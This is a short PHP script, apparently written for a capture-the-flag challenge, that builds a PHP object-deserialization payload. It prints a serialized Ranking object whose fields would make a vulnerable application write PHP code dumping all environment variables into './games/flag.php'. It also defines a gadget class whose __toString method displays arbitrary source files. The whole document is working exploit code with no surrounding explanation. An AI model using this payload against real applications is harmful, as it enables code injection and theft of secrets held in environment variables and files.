<?php
Class GPLSourceBloater{
    public $source;

    public function __toString()
    {
        return highlight_file('license.txt', true).highlight_file($this->source, true);
    }
}

class Game{
  public $gameBoard;
  public $score = 0;
  public $actions = [];
  public $initgameBoard;
  public $srand;
  public $name;
  public $ranking;
  }

Class Ranking{
    public $ranking = "<?php \$x = getenv(); print_r(\$x); >";
    public $changed = false;
    public $path = "./games/flag.php";
}

$ranking = new Ranking();
echo serialize($ranking);

?>
